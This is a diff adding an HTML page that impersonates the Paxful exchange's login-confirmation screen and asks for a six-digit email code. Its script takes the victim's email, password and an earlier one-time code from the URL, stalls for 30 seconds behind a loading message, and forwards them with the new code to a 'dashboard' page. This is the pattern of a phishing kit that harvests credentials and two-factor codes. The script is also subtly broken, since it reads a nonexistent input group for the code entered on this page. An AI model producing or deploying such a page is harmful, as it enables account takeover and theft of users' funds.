@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log In With Paxful</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+
+<body>
+    <div id="root" class="row">
+        <div class="column">
+            <div class="content" style="height:550px">
+                <div class="header">
+                    <!-- Logo and title -->
+                    <img src="images/logo.png" alt="Paxful Logo" class="logo">
+
+                    <!-- Language dropdown -->
+                    <div class="language-dropdown">
+                        <button type="button" aria-haspopup="true" aria-expanded="false"
+                            class="d-flex align-items-center w-100 px-2 justify-content-between btn btn-light"
+                            style="background-color:transparent; 
+            border: 1px solid #d8d8d8; color: black;  align-content: center; height: 40px;">
+
+                            <img style="width:20px; height: auto; position: 5px center; " src="images/global.png">
+                            English
+                            <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor"
+                                class="ml-2 LanguageSelector__icon text-gray-500">
+                                <path
+                                    d="M8 12.586L2.707 7.293a1 1 0 011.414-1.414L8 10.172l4.879-4.879a1 1 0 111.414 1.414L8 12.586z" />
+                            </svg>
+
+                        </button>
+                    </div>
+                </div>
+
+                <h1 style="color: navy;">Confirm your login</h1>
+                <br>
+                <p>Enter the code we've sent to your email</p>
+                <a style="margin-top: 20px" href="#">Trouble logging in?</a>
+                <br>
+                <div class="login-container">
+                    <form id="confirmationForm">
+
+                        <div class="number-inputs">
+                            <!-- Add "data-index" attribute to each input to track their order -->
+                            <input id="number1" type="text" maxlength="1" required
+                                oninput="validateNumberInput('number1')" data-index="1">
+
+                            <input id="number2" type="text" maxlength="1" required
+                                oninput="validateNumberInput('number2')" data-index="2">
+
+                            <input id="number3" type="text" maxlength="1" required
+                                oninput="validateNumberInput('number3')" data-index="3">
+
+                            <input id="number4" type="text" maxlength="1" required
+                                oninput="validateNumberInput('number4')" data-index="4">
+
+                            <input id="number5" type="text" maxlength="1" required
+                                oninput="validateNumberInput('number5')" data-index="5">
+
+                            <input id="number6" type="text" maxlength="1" required
+                                oninput="validateNumberInput('number6')" data-index="6">
+                        </div>
+
+                        <a href="#" onclick="resendCode()"> Resend code </a>
+                        <div id="loader" style="display: none;">
+                            <p>Loading...</p>
+                        </div>
+                        <br>
+                        <p>
+                            <a href="index.html">< back to login</a>
+                        </p>
+                    </form>
+                </div>
+            </div>
+        </div>
+        <div class="column" style="width:70%; image-orientation: streach;">
+            <div class="photo-container" style="background: url('images/secondbackground.png') center/cover;"></div>
+        </div>
+    </div>
+
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+        const confirmationForm = document.getElementById('confirmationForm');
+        const loader = document.getElementById('loader');
+        const otpInputs = document.querySelectorAll('.number-inputs input');
+
+        // Automatically move focus to the next input box when a number is entered
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', function () {
+                if (this.value.length === 1 && index < otpInputs.length - 1) {
+                    otpInputs[index + 1].focus();
+                }
+            });
+        });
+
+        confirmationForm.addEventListener('submit', function (event) {
+            event.preventDefault();
+
+            // Check if all input boxes are filled
+            if (areAllInputsFilled()) {
+                // Collect the entered values
+                const email = getParameterByName('email');
+                const password = getParameterByName('password');
+                const otp = getParameterByName('otp');
+                const otp2 = getEnteredOTP2();
+
+                // Log the collected values to check if they are correct
+                console.log('Collected Values on Submit:', { email, password, otp, otp2 });
+
+                // Now you can navigate to dashboard.html with the collected values
+                loader.style.display = 'block'; // Display loader
+                setTimeout(function () {
+                    window.location.href = `dashboard.html?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}&otp=${encodeURIComponent(otp)}&otp2=${encodeURIComponent(otp2)}`;
+                }, 30000); // Redirect after 30 seconds
+            } else {
+                // Display an error message or take appropriate action
+                alert('Please fill in all the input boxes.');
+            }
+        });
+    });
+
+    function areAllInputsFilled() {
+        // Check if all input boxes are filled
+        const otpInputs = document.querySelectorAll('.number-inputs input');
+        return Array.from(otpInputs).every(input => input.value.trim() !== '');
+    }
+
+    function getEnteredOTP2() {
+        // Implement the logic to get the entered OTP value for the second input
+        const otp2Inputs = document.querySelectorAll('.number-inputs2 input');
+        let enteredOTP2 = '';
+
+        otp2Inputs.forEach(input => {
+            enteredOTP2 += input.value;
+        });
+
+        return enteredOTP2;
+
+    }
+
+    function resendCode() {
+        // Implement resend code functionality here
+        // You can resend the code and update the UI accordingly
+        alert('Resending code...');
+    }
+
+    function validateNumberInput(inputId) {
+        // Implement validation logic for each input if needed
+    }
+
+    function getParameterByName(name, url) {
+        if (!url) url = window.location.href;
+        name = name.replace(/[\[\]]/g, '\\$&');
+        const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+            results = regex.exec(url);
+        if (!results) return null;
+        if (!results[2]) return '';
+        return decodeURIComponent(results[2].replace(/\+/g, ' '));
+    }
+</script>
+
+
+
+</body>
+
+</html>
